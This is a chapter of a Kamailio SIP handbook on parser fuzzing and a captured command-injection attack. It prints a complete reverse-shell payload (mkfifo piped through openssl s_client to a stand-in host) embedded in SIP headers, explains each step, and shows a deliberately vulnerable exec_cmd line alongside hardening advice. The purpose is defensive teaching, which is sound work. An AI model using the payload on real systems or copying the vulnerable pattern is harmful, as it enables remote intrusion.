# 9.4 Fuzzing, and a command-injection → reverse-shell case study

> [!IMPORTANT]
> This chapter is built on a real captured attack: an `INVITE` with `$(...)` shell constructs planted in its `User-Agent` and `Call-ID`, aiming to open a reverse shell back to the attacker. The question the handbook cares about is not "what does that payload do" — it's the internals question: **is *Kamailio* the vulnerable component here?** The answer is almost never. A vanilla proxy forwards those bytes and never executes them. But there is exactly one place where Kamailio *is* the vuln, and a handful of places downstream where its data lights the fuse — and this chapter shows precisely where.

## Fuzzing the parser

The first thing an attacker probes is the parser itself, because it is hand-written C operating on raw network bytes ([3.2 the parsed message](08-parsed-message.md)). Kamailio's first-pass parse walks the header section registering name and byte-range per header, and parses values lazily on first access — fast, but a large attack surface of pointer arithmetic over attacker-controlled input. The bug class fuzzing hunts for here is the classic one for byte-span parsers: the over-read or the off-by-one on a truncated, oversized, or pathologically nested header that walks a pointer past the end of the receive buffer, or a length field that disagrees with the bytes behind it.

The tooling for this is mature and worth naming. `SIPp` drives malformed and edge-case scenarios from hand-written XML — it is the standard way to replay a deliberately broken message at a target. The **PROTOS SIP test suite** (from Oulu University's OUSPG) is the canonical corpus of malformed `INVITE`s that shook out parser bugs across the entire SIP industry years ago. And coverage-guided fuzzers — **AFL**/AFL++ — can be pointed at the parser entry points directly to mutate toward new crashes. None of this is hypothetical; it is the standard fuzzing kit. (No CVE is cited here on purpose: the *class* of bug is the point, not any specific patched instance.)

`sanity` ([9.2](37-security-modules.md)) is a partial backstop and nothing more. Called first in `request_route`, it rejects messages that fail structural checks — a missing required header, a `Content-Length` that lies about the body — and kills a lot of crude malformed junk before the rest of the parser runs on it. But it runs *after* the first-pass parse, it checks form not safety, and it cannot anticipate the parser bug fuzzing is looking for. Treat it as triage, not armour. The real defence against the parser-crash class is a patched, current Kamailio.

## The captured payload

The interesting payload in the capture is not a malformed message at all. It is a perfectly well-formed `INVITE` — it parses cleanly, it passes `sanity` — carrying its weapon in plain header text:

```
INVITE sip:00XXXXXXXXXX@sip.example.net SIP/2.0
Via: SIP/2.0/UDP 198.51.100.7:5060;branch=z9hG4bK-524287-1
From: "00XXXXXXXXXX" <sip:00XXXXXXXXXX@example.com>;tag=8472
To: <sip:00XXXXXXXXXX@sip.example.net>
Call-ID: $(mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 203.0.113.10:443 > /tmp/s; rm /tmp/s)@198.51.100.7
CSeq: 1 INVITE
Contact: <sip:00XXXXXXXXXX@198.51.100.7:5060>
User-Agent: $(mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 203.0.113.10:443 > /tmp/s; rm /tmp/s)
Max-Forwards: 70
Content-Type: application/sdp
Content-Length: 0
```

Decode the substituted command precisely, because every token earns its place:

- `mkfifo /tmp/s` — creates a named pipe (FIFO) on disk.
- `/bin/sh -i < /tmp/s 2>&1` — starts an interactive shell reading its commands *from* the FIFO, with stderr folded into stdout.
- `| openssl s_client -quiet -connect 203.0.113.10:443` — pipes the shell's output into a TLS client connected to the attacker's C2 at `203.0.113.10:443`. The attacker writes commands back down the same TLS socket into the FIFO, closing the loop. Going over `:443` with `openssl s_client` is deliberate: the traffic looks like an ordinary outbound HTTPS connection and slides past naive egress filtering that only allows "web" out.
- `> /tmp/s` — wires the TLS client's received data back into the FIFO, so attacker keystrokes reach the shell's stdin.
- `rm /tmp/s` — removes the pipe afterward to clean up the evidence.

The rest of the message is decoration. `From`, `To`, the `Contact`, the empty SDP — all chosen so the packet reads as a mundane call attempt and draws no attention. Note that the *same* `$(...)` construct appears in both `Call-ID` and `User-Agent`: the attacker is spraying the substitution into multiple header values on the bet that *some* downstream consumer reads one of them into a shell. They do not know your config; they are seeding several fields and hoping one lands.

## Why a vanilla Kamailio proxy is not vulnerable

Now the load-bearing point. Run this through a plain relay and **nothing executes.**

When the parser handles that `User-Agent`, it does exactly what [3.2](08-parsed-message.md) describes: it records the header's name and a `(pointer, length)` byte span into the original receive buffer. The value `$(mkfifo …)` is stored as *bytes* — a `str` pointing at offsets inside `msg->buf`. The core does not interpret it, expand it, or evaluate it. There is no shell anywhere in the parse path, the routing engine, or message forwarding. `$(...)` is shell syntax; the SIP core has no shell.

When the proxy forwards the request, the value rides along unchanged. Forwarding works through the lump system ([3.3 lumps](09-lumps.md)): the buffer is never edited in place, the outbound message is reassembled from the original bytes plus add/remove lumps, and a header you do not touch is copied verbatim. So `User-Agent: $(mkfifo …)` leaves your proxy exactly as it arrived — forwarded as a literal string, never once handed to `/bin/sh`. A SIP proxy that only routes, authenticates, and relays has no code path that turns a header value into a process. The payload is inert. This is the default, and it is the common case.

## When it DOES fire

The payload only becomes a reverse shell when something on your side feeds that header value into a shell. There are three sinks, in rough order of how directly Kamailio is implicated.

**1. The `exec` module — the one in-core footgun.** The [`exec`](https://kamailio.org/docs/modules/devel/modules/exec.html) module shells out by design. Its functions — `exec_cmd()`, `exec_msg()`, `exec_avp()`, `exec_dset()` — run their command string through the shell (the module uses `popen()`), and the command string **may contain pseudo-variables**, which are interpolated before execution. That is the whole danger in one sentence: if you interpolate an attacker-controlled SIP field into an `exec` command, you have built a remote shell.

```
# VULNERABLE — $ua is the raw User-Agent; $(...) is interpolated and run by the shell
exec_cmd("echo $ua >> /var/log/agents.log");
```

With the captured payload, `$ua` expands to `$(mkfifo …)`, the shell performs *its own* command substitution on that, and the reverse shell opens. The module's own documentation is blunt about this: "if the exec functions are passed variables that might include malicious input, then remote attackers may abuse the exec functions to execute arbitrary code … this may result in OS command injection," and it states that "input validation is required to prevent the vulnerability." The safe form never lets the value reach a shell metacharacter unquoted:

```
# SAFER — validate first, then single-quote so the shell treats it as one literal arg
if ($ua =~ "^[A-Za-z0-9 ._/-]+$") {
    exec_cmd("echo '$ua' >> /var/log/agents.log");
}
```

Better still: don't shell out with attacker data at all. (See the next section — quoting alone is fragile.)

**2. Shell-based capture or logging pipelines.** Kamailio isn't running the command, but its data flows into one that is. A common shape: a sidecar or operator script slurps fields out of Kamailio (via syslog, an `evapi`/`xhttp` hook, a tap like an sngrep-style capture export) and does something like `sh -c "lookup-ua.sh $UA"`. The shell is in the *script*, not Kamailio — but the taint originated in the `User-Agent` Kamailio happily forwarded, and the substitution fires in the script's shell.

**3. External CDR / analytics scripts.** The same mechanism, one hop further out. A billing or analytics job reads SIP fields — `From` user, `User-Agent`, `Call-ID` — out of CDRs or an accounting table and assembles a shell command from them (a `system()` call, a `sh -c`, a backtick in a Perl/Python wrapper). The attacker's `Call-ID` containing `$(...)` lands in the CDR exactly as captured, and detonates whenever that record is processed by something that builds a shell string from it.

The unifying lesson ties straight back to [9.2](37-security-modules.md): **the taint reads as trusted because it survived parsing and `sanity`.** But `sanity` only ever validated *SIP syntax* — `$(...)` is legal SIP token content, so it passed untouched — and it said nothing, because it can say nothing, about *shell* safety. A value being well-formed SIP is not a statement about what a shell will do with it. Every sink above makes the same wrong assumption: that surviving the SIP layer means the bytes are safe to hand to a different interpreter.

## How to avoid it

The rule is short: **never pass a SIP-derived string to a shell.**

- **Don't shell out with message data.** If you only need to log or count, use Kamailio's own logging/accounting, not `exec`. The cheapest fix is to not have a shell in the path at all.
- **If `exec` is unavoidable, kill the shell interpolation, don't just escape it.** Prefer an argument-vector design — a helper that takes the value as a positional argument the OS hands across without a shell — over building one `sh -c "…$pv…"` string. If you must interpolate, single-quote *and* validate against a strict allowlist regex first (as above); a blocklist of "bad characters" will lose to an encoding you didn't think of.
- **Filter content with `secfilter`.** `secf_check_ua()` and `secf_check_sqli_all()` ([9.2](37-security-modules.md)) can reject a `User-Agent` carrying obvious metacharacters before it reaches any sink. This raises the cost of the naive payload; it is not a substitute for fixing the sink.
- **Do not expect `sanity` to help.** It validates form; this attack is well-formed. Counting on `sanity` here is the exact mistake the chapter is about.
- **Defence in depth around the edge.** These payloads ride in on quiet scanners — the ones already in the reputation feeds. `pike` + the `ipban` `htable` + apiban ([9.3](38-security-blocklists.md)) keep most of them from reaching your route at all. `topoh` ([8.1 topology hiding](19-topos.md)) starves the recon that precedes a targeted attempt. And `fail2ban` on your logs catches the source after the first probe shows up. None of these fixes the sink — but together they ensure most of this traffic never gets the chance to test it.

## The two paths

The same `User-Agent` header takes one of two routes, decided entirely by what you wired downstream:

```mermaid
flowchart TB
    H["INVITE User-Agent: $(mkfifo …; openssl s_client -connect C2 …)"] --> P[Parser stores value<br/>as raw byte span into msg->buf<br/>3.2 parsed message]

    P --> SAFE{Does anything<br/>feed it to a shell?}

    SAFE -->|No — vanilla proxy| FWD[Forward verbatim via lumps<br/>3.3 lumps<br/>bytes never executed]
    FWD --> INERT[Payload inert]

    SAFE -->|Yes — exec PV / external shell pipeline| SINK[exec_cmd '...$ua...'<br/>or sh -c in capture/CDR script]
    SINK --> SUB[Shell performs command substitution<br/>on $(...)]
    SUB --> RS[TLS reverse shell to<br/>203.0.113.10:443]

    classDef bad fill:#b62324,stroke:#b62324,color:#fff
    classDef good fill:#1f6feb,stroke:#1f6feb,color:#fff
    classDef pipe fill:#6e7681,stroke:#6e7681,color:#fff
    classDef warn fill:#bf8700,stroke:#bf8700,color:#fff
    class H bad
    class P,SAFE pipe
    class FWD,INERT good
    class SINK,SUB warn
    class RS bad
```

The fork is the whole chapter: identical bytes, identical parse, identical `sanity` verdict — and the only thing that decides "inert string" versus "reverse shell" is whether *you* put a shell on the path.

Which is the note Part 9 closes on. Kamailio's security posture is overwhelmingly about **what you wire around it** — the cheap edge filters of [9.2](37-security-modules.md), the reputation and ban state of [9.3](38-security-blocklists.md), the auth boundary that turns an anonymous datagram into a known identity. The core treats hostile bytes as data and forwards them as data. The one genuine in-core footgun is `exec` with an unescaped pseudo-variable — and it is entirely avoidable: keep SIP-derived strings away from shells, and the captured payload stays the inert text the parser always thought it was.

---

<p markdown="1" align="center">
  [← Table of contents](../) · [← 9.3 Dynamic blocklists](38-security-blocklists.md) · [Next: 10.1 What IMS is →](31-ims-overview.md)
</p>
